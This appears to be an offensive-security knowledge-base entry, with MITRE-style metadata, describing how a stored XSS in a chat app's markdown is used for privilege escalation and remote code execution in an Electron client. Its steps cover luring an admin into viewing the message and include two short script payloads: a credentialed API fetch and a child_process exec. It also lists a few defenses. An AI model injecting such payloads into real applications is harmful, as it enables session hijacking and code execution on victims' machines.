---
id: proc-execute-xss-escalation
tags:
  - xss
  - privilege-escalation
  - rce
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
commands: []
verified: false
platforms:
  - Web
  - Electron
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:23:41.052Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[JavaScript]]'
---
---
id: proc-execute-xss-escalation
name: Execute-XSS-for-Privilege-Escalation-and-RCE
type: procedure
verified: false
submitted: false
created_at: 2023-10-01T00:00:00Z
updated_at: 2023-10-01T00:00:00Z
tactics: [[Execution]], [[Privilege Escalation]]
techniques: [[JavaScript]]
sub_techniques: []
tags: xss, privilege-escalation, rce
commands: []
platforms: Web, Electron
tools: []
---

# Execute-XSS-for-Privilege-Escalation-and-RCE

## Summary

This procedure triggers the stored XSS payload execution upon message view, leveraging JS to escalate privileges, read files, and achieve RCE on the Electron app.

## Description

When a user views the injected message, the unsanitized markdown renders the script, executing in the browser or Electron context. In web, it can steal sessions for priv esc; in Electron, Node.js APIs enable file reads and exec. Scenario: Attacker lures admin to view message. Outcomes: Full user compromise, data exfil, system access.

## Requirements

1. Target user (e.g., admin) to view the message.
2. Electron app for RCE (web for basic esc).
3. Payload capable of context-aware execution.

## Defense

Defensive measures and detection strategies:

- Isolate Electron renderer processes with sandboxing.
- Disable Node.js integration in Electron where possible.
- Browser extensions or proxies to block XSS payloads.

## Objectives

1. Execute JS for session manipulation and priv esc.
2. Access local files via Electron APIs.
3. Achieve RCE for broader system impact.

## Instructions

### Step 1: Trigger Execution

**Context**: Ensure a target views the message to fire the script.

Direct target to the channel or wait for natural view.

> Upon render, JS runs automatically. Expected: Console errors or alerts indicating execution.

### Step 2: Escalate Privileges

**Context**: Use executed JS to hijack higher-priv sessions.

Payload example: `<script>fetch('/api/v1/users.setStatus?status=online&message=admin', {credentials: 'include'}).then(()=>location.reload());</script>`

> Mimics admin actions. Expected: Elevated role or access.

### Step 3: RCE on Electron

**Context**: In Electron, access Node modules for code exec.

Payload: `<script>const {exec} = require('child_process'); exec('ls /', (err, stdout) => alert(stdout));</script>`

> Runs system commands. Expected: Command output in alert or network exfil.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Privilege Escalation]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[privilege-escalation]]
- [[rce]]
